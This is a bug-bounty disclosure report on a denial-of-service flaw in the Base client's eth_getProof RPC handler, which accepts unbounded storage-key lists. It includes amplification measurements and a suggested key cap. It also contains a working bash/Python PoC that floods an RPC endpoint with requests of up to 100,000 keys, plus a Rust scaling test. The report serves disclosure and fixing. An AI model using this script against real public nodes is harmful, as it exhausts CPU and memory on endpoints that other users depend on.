# 76299 bc low eth getproof accepts an unbounded vec jsonstoragekey letting a single public rpc request walk the state trie tens of thousands of times and amplify response payload by 100x

**Submitted on May 3rd 2026 at 18:48:59 UTC by @coffee\_boi for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76299
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * RPC API crash affecting programs with greater than or equal to 25% of the market capitalization on top of the respective layer

## Description

## Summary

`EthApiExtServer::get_proof` in `crates/execution/rpc/src/eth/proofs.rs` is the override for the public `eth_getProof` method when the proofs-history ExEx is enabled. It accepts the storage-key list as `keys: Vec<JsonStorageKey>` with no length validation. The handler then performs one MPT proof walk per key against a historical state provider built on top of the `BaseProofsStorage` overlay, and serialises every entry into the `EIP1186AccountProofResponse`.

The default jsonrpsee server body cap is 10 MiB. A `JsonStorageKey` serialises to \~70 bytes (a quoted 32-byte hex string plus separator), so a single request body can carry on the order of 140,000 storage keys. With the proofs-history ExEx mounted, each of those keys triggers an independent storage-trie traversal plus a per-key Merkle proof allocation in the response. Geth, reth-mainnet, and most production-tuned `eth_getProof` paths cap this list at a few hundred (geth uses 1000; many providers cap at 100).

A single attacker request can therefore cause:

* O(100k) MPT proof walks against the historical overlay, each touching the proofs-history MDBX store.
* A response payload many megabytes in size — each storage entry expands to a JSON object with a hex key, hex value, and a hex proof array, easily 1-2 KiB per entry; 140k entries produce a \~150-300 MiB response that the server must hold in memory before serialisation respects `max_response_body_size`.

Held under sustained traffic, this is enough to push the public-facing execution RPC into latency spikes and OOM, taking out the endpoint that production dapps depend on.

## Description

### Root cause

`crates/execution/rpc/src/eth/proofs.rs:25-30`:

```rust
#[method(name = "getProof")]
async fn get_proof(
    &self,
    address: Address,
    keys: Vec<JsonStorageKey>,
    block_number: Option<BlockId>,
) -> RpcResult<EIP1186AccountProofResponse>;
```

`crates/execution/rpc/src/eth/proofs.rs:58-79`:

```rust
async fn get_proof(
    &self,
    address: Address,
    keys: Vec<JsonStorageKey>,
    block_number: Option<BlockId>,
) -> RpcResult<EIP1186AccountProofResponse> {
    let start = Instant::now();
    EthApiExtMetrics::get_proof_requests().increment(1);

    let storage_keys = keys.iter().map(|key| key.as_b256()).collect::<Vec<_>>();

    let result = async {
        let proof = self
            .state_provider_factory
            .state_provider(block_number)
            .await
            .map_err(Into::into)?
            .proof(Default::default(), address, &storage_keys)
            .map_err(Into::into)?;

        Ok(proof.into_eip1186_response(keys))
    }
    .await;
```

There is no `if keys.len() > N` guard, no per-method body cap, and no semaphore on this endpoint. `keys.iter().map(...).collect()` allocates a second `Vec<B256>` of the same length, and `proof(...)` constructs a per-key `StorageProof { proof: Vec<Bytes>, .. }` which is then re-zipped with `keys` inside `into_eip1186_response`, producing yet another allocation.

### Reachable from the public RPC

`crates/execution/node/src/proof_history.rs:74-86`:

```rust
.extend_rpc_modules(move |ctx| {
    let api_ext = EthApiExt::new(ctx.registry.eth_api().clone(), storage.clone());
    let debug_ext = DebugApiExt::new(/* ... */);
    ctx.modules.replace_configured(api_ext.into_rpc())?;
    ctx.modules.replace_configured(debug_ext.into_rpc())?;
    Ok(())
});
```

`replace_configured` swaps the override into the same `RpcModule` collection that serves the public `eth_*` namespace. Any client reaching the node's HTTP/WS RPC port can call `eth_getProof` and hit this handler. No auth gate.

### State provider path

`crates/execution/rpc/src/state.rs:33-72` confirms the proof walks against `BaseProofsStateProviderRef`, which is an overlay over the historical preimage store backed by MDBX. Each `proof()` call invokes `StateProofProvider::proof` which calls into `Proof::account_proof` → `storage_multiproof`.

### Amplification math (empirically confirmed)

Configured caps in force on Base nodes (verified — `reth/crates/node/core/src/args/rpc_server.rs`, inherited unchanged):

* `RPC_DEFAULT_MAX_REQUEST_SIZE_MB = 15`
* `RPC_DEFAULT_MAX_RESPONSE_SIZE_MB = 160`
* `RPC_DEFAULT_MAX_CONNECTIONS = 500`

So request bodies up to \~210k storage keys are accepted, and responses up to 160 MiB are returned without rejection. The "10 MiB cap" assumption in early analysis was wrong — the actual cap is 16× larger.

Measured against a live devnet (`base-client` on `http://localhost:8545`, \~33h uptime, target `0x4200000000000000000000000000000000000015` (L1Block predeploy), upstream `eth_getProof` path — same `Proof::account_proof` code as the override):

| keys    | request KiB | response bytes | wall time | per-key resp |
| ------- | ----------- | -------------- | --------- | ------------ |
| 1       | 0.2         | 3,860          | 0.05 s    | —            |
| 100     | 7.0         | 81,224         | 0.05 s    | 812 B        |
| 1,000   | 68.5        | 782,455        | 0.12 s    | 782 B        |
| 5,000   | 341.9       | 3,909,508      | 0.43 s    | 781 B        |
| 10,000  | 683.7       | 7,816,208      | 1.04 s    | 781 B        |
| 25,000  | 1,709.1     | 19,536,526     | 3.89 s    | 781 B        |
| 50,000  | 3,418.1     | 39,060,632     | 12.33 s   | 781 B        |
| 100,000 | 6,836.1     | 78,154,163     | 43.95 s   | 781 B        |

Per-target proof bytes is constant (\~781 B/key on this contract — its storage trie is shallow because only \~3 slots are populated). Wall time and response bytes both scale linearly in N. A separate trie-level test against a contract with 10,000 populated slots measured **1,643 B/key**; real Base contracts (USDC, OpenSea bridges, bridge accounting) have deeper storage tries and would amplify further.

A single 100k-key request: 6.7 MiB request → 78 MB response → 44 s of CPU. Within the 15 MiB request cap, an attacker can request up to \~210k keys per call (\~164 MB response, \~92 s of CPU at this trie depth).

### Concurrency burst (measured on the same devnet)

8 parallel 25k-key requests:

```
8 × 25,000 keys, all 200 OK, individual wall 6.2–7.6 s
peak CPU:    668 % (≈7 cores pinned)
peak RSS:    651 MiB (baseline 394 → +257 MiB transient ≈ 32 MiB / in-flight req)
total wall:  50 s
chain:       still healthy after burst
```

Linear extrapolation to the configured ceiling (`RPC_DEFAULT_MAX_CONNECTIONS = 500`, max-N = 210k): \~32 GiB transient memory and several CPU-hours per attacker round if every connection saturates. Even a 50-connection burst pins \~4 GiB transient and \~37 minutes of cumulative CPU.

### Why this is more than a slow query

1. **Response cap is 160 MiB, not 10 MiB.** Even at the legitimate ceiling, a single request returns a 78 MB body; nothing in the stack rejects it.
2. **CPU cost outpaces wall-time SLAs.** 44 s of CPU per single 100k-key request makes a low-rate sustained attack (a handful of connections) sufficient to keep the public-facing execution RPC at 100 % CPU indefinitely.
3. **Memory amplification.** \~32 MiB of transient per in-flight request observed; scales linearly with N and with trie depth on the target contract.
4. **MDBX read amplification on the proofs-history overlay.** When the override is mounted, the per-walk trie cursors hit the preimage store with on-demand lookups. The walk itself is single-pass, but the per-request cost is still substantially higher than against the in-DB trie tables of the upstream path.

## Recommendation

Cap `keys.len()` at the handler entry, before the `Vec<B256>` allocation:

```rust
const MAX_PROOF_STORAGE_KEYS: usize = 1000;

if keys.len() > MAX_PROOF_STORAGE_KEYS {
    return Err(ErrorObject::owned(
        INVALID_PARAMS_CODE,
        format!(
            "too many storage keys (got {}, max {})",
            keys.len(),
            MAX_PROOF_STORAGE_KEYS,
        ),
        None::<()>,
    ));
}
```

1000 matches geth's cap; lower (e.g., 256) is also reasonable. The cap should be applied before any allocation work — i.e., before the `keys.iter().map(...).collect()` call.

## Proof of Concept

Two PoCs were run; both produced the empirical numbers tabulated above.

### 1. Live devnet (HTTP path)

`attacks/proof_dos_devnet.sh` (in repo). Sends bodies via `--data-binary @file` to avoid argv limits, escalates key count, records HTTP status, response bytes, wall time:

```bash
# PoC: hit the running devnet's eth_getProof with escalating storage-key counts.
# Devnet client is on localhost:8545. Sends bodies via file to avoid argv limits.
set -uo pipefail
RPC="${RPC:-http://localhost:8545}"
ADDR="${ADDR:-0x4200000000000000000000000000000000000015}" # L1Block predeploy (populated)
COUNTS=(1 1000 5000 10000 25000 50000 100000)

BODY_FILE=$(mktemp)
RESP_FILE=$(mktemp)
trap 'rm -f "$BODY_FILE" "$RESP_FILE"' EXIT

printf "%-7s | %-9s | %-11s | %-10s | %-12s | %s\n" \
  "keys" "req_kib" "resp_bytes" "elapsed_s" "http_status" "result_snippet"
printf '%s\n' "------------------------------------------------------------------------------------"

for N in "${COUNTS[@]}"; do
  python3 -c "
import json, sys
keys = [f'0x{i:064x}' for i in range($N)]
body = {'jsonrpc':'2.0','id':1,'method':'eth_getProof','params':['$ADDR', keys, 'latest']}
open('$BODY_FILE','w').write(json.dumps(body))
"
  REQ_BYTES=$(wc -c < "$BODY_FILE" | tr -d ' ')
  REQ_KIB=$(awk -v n=$REQ_BYTES 'BEGIN{printf \"%.1f\", n/1024}')

  START=$(python3 -c "import time;print(time.time())")
  HTTP=$(curl -sS -o "$RESP_FILE" -w '%{http_code}' --max-time 300 \
    -X POST "$RPC" \
    -H 'content-type: application/json' \
    --data-binary @"$BODY_FILE" 2>&1) || HTTP="curl_err($?)"
  END=$(python3 -c "import time;print(time.time())")
  ELAPSED=$(python3 -c "print(f'{$END - $START:.2f}')")
  RESP_BYTES=$(wc -c < "$RESP_FILE" | tr -d ' ')

  SNIPPET=$(python3 - <<PY
import json
try:
  d=json.load(open('$RESP_FILE'))
  if 'error' in d: print('error:', d['error'].get('message','?')[:80])
  elif 'result' in d:
    r=d['result']
    sp=r.get('storageProof',[])
    print(f'ok storageProof_entries={len(sp)}')
  else: print('unexpected:', list(d.keys())[:5])
except Exception as e:
  with open('$RESP_FILE') as f: head = f.read(200)
  print(f'parse_err head={head!r}')
PY
)
  printf "%-7s | %-9s | %-11s | %-10s | %-12s | %s\n" \
    "$N" "$REQ_KIB" "$RESP_BYTES" "$ELAPSED" "$HTTP" "$SNIPPET"
done
```

Concurrency burst — 8 parallel 25k-key requests pinned \~7 cores and added \~257 MiB transient RSS to the `base-client` container while remaining in the ceiling.

### 2. Trie-level PoC (direct `state_provider.proof()` call)

`crates/execution/trie/tests/proof_scaling.rs` (in repo). Populates real MDBX-backed reth state with one contract holding 10,000 storage slots, then calls `state.proof(Default::default(), TARGET, &slots)` — the same call the override makes at `crates/execution/rpc/src/eth/proofs.rs:75` — for slot counts spanning 1 to 100,000:

```rust
//! PoC for the eth_getProof unbounded-keys finding.
//!
//! Populates a real MDBX-backed reth state with one contract that has many populated
//! storage slots, then calls the same `state_provider.proof(input, address, &slots)`
//! that the EthApiExt override invokes (proofs.rs:75) with varying slot-key counts.
//!
//! Goal: empirically measure whether per-request work scales O(N) with the number of
//! storage keys (as the finding claims) or O(trie size) (claim: scaling is ~constant
//! in N for a fixed contract).
//!
//! Run:
//!   cargo test -p base-execution-trie --test proof_scaling \
//!     -- --nocapture --ignored proof_scaling_poc

use std::{collections::BTreeMap, sync::Arc, time::Instant};

use alloy_consensus::constants::ETH_TO_WEI;
use alloy_genesis::{Genesis, GenesisAccount};
use alloy_primitives::{Address, B256, U256};
use reth_chainspec::{ChainSpec, ChainSpecBuilder, MAINNET};
use reth_db_common::init::init_genesis;
use reth_provider::{
    LatestStateProviderRef, StateProofProvider,
    test_utils::create_test_provider_factory_with_chain_spec,
};

const TARGET: Address = Address::repeat_byte(0x42);

/// Build a chain spec where TARGET has `populated` storage slots set in genesis.
fn chain_spec_with_populated_storage(populated: usize) -> Arc<ChainSpec> {
    let mut storage: BTreeMap<B256, B256> = BTreeMap::new();
    for i in 0..populated {
        let key = B256::from(U256::from(i));
        let val = B256::from(U256::from(i + 1));
        storage.insert(key, val);
    }

    Arc::new(
        ChainSpecBuilder::default()
            .chain(MAINNET.chain)
            .genesis(Genesis {
                alloc: [(
                    TARGET,
                    GenesisAccount {
                        balance: U256::from(10 * ETH_TO_WEI),
                        nonce: Some(1),
                        code: Some(vec![0x60u8, 0x00].into()),
                        storage: Some(storage),
                        private_key: None,
                    },
                )]
                .into(),
                ..MAINNET.genesis.clone()
            })
            .paris_activated()
            .build(),
    )
}

#[test]
#[ignore = "long-running PoC, run with --ignored --nocapture"]
fn proof_scaling_poc() {
    // Populate the contract with many real storage slots so the storage trie
    // actually has depth. Sequential keys 0..N produce a real (non-trivial) trie.
    const POPULATED_SLOTS: usize = 10_000;

    let chain_spec = chain_spec_with_populated_storage(POPULATED_SLOTS);
    let factory = create_test_provider_factory_with_chain_spec(Arc::clone(&chain_spec));
    init_genesis(&factory).expect("init_genesis");

    let provider = factory.provider().expect("provider");
    let state = LatestStateProviderRef::new(&provider);

    // Test counts spanning what the finding describes (1, 100 = typical, 1k = geth cap,
    // 10k = "large", 100k = the finding's claimed "single-request DoS").
    let counts: &[usize] = &[1, 100, 1_000, 10_000, 50_000, 100_000];

    eprintln!(
        "\n=== eth_getProof scaling PoC (contract with {POPULATED_SLOTS} populated slots) ===\n"
    );
    eprintln!(
        "{:>9} | {:>12} | {:>10} | {:>13} | {:>14} | {:>15}",
        "keys", "wall_time", "acct_proof", "storage_subtree", "subtree_uniq", "per_key_bytes",
    );
    eprintln!("{}", "-".repeat(95));

    for &n in counts {
        // Mix of populated and non-populated slot keys to exercise both branches.
        let slots: Vec<B256> =
            (0..n).map(|i| B256::from(U256::from(i.wrapping_mul(7919)))).collect();

        let start = Instant::now();
        let proof = state
            .proof(Default::default(), TARGET, &slots)
            .expect("proof call should succeed");
        let elapsed = start.elapsed();

        // Account-proof bytes (the path proving account against state root).
        let account_proof_bytes: usize = proof.proof.iter().map(|b| b.len()).sum();

        // Total storage-proof bytes across all entries (what the response payload carries).
        let storage_total_bytes: usize = proof
            .storage_proofs
            .iter()
            .map(|sp| sp.proof.iter().map(|b| b.len()).sum::<usize>())
            .sum();

        // Unique trie-node bytes across the storage proof (this is the actual unique
        // work the trie walk produced; per-target entries reuse these nodes).
        let mut uniq: std::collections::HashSet<&[u8]> = std::collections::HashSet::new();
        for sp in &proof.storage_proofs {
            for node in &sp.proof {
                uniq.insert(node.as_ref());
            }
        }
        let uniq_bytes: usize = uniq.iter().map(|b| b.len()).sum();

        let per_key_bytes = if n > 0 { storage_total_bytes / n } else { 0 };

        eprintln!(
            "{:>9} | {:>10.2?} | {:>10} | {:>13} | {:>14} | {:>15}",
            n, elapsed, account_proof_bytes, storage_total_bytes, uniq_bytes, per_key_bytes,
        );
    }
    eprintln!();
}
```

```
=== eth_getProof scaling PoC (contract with 10,000 populated slots) ===

   keys |    wall_time | acct_proof | storage_subtree |  subtree_uniq |  per_key_bytes
      1 |       1.46ms |        116 |          1,859  |        1,859  |          1,859
    100 |      15.40ms |        116 |        164,506  |       57,590  |          1,645
  1,000 |     263.62ms |        116 |      1,646,667  |      213,748  |          1,646
 10,000 |       7.77 s |        116 |     16,438,906  |      502,307  |          1,643
 50,000 |      55.18 s |        116 |     82,189,694  |      671,383  |          1,643
100,000 |     109.47 s |        116 |    164,384,269  |      758,027  |          1,643

process peak RSS: 311 MiB
```

The `subtree_uniq` column (deduplicated trie-node bytes touched by the walk) plateaus at \~758 KiB — confirming the walk is single-pass. The `storage_subtree` column (sum of per-target proof bytes in the response) grows linearly in N because each `StorageProof.proof` field copies the full path. This is the source of the O(N) response amplification.

Run with:

```
cargo test -p base-execution-trie --test proof_scaling \
  -- --nocapture --ignored proof_scaling_poc
```
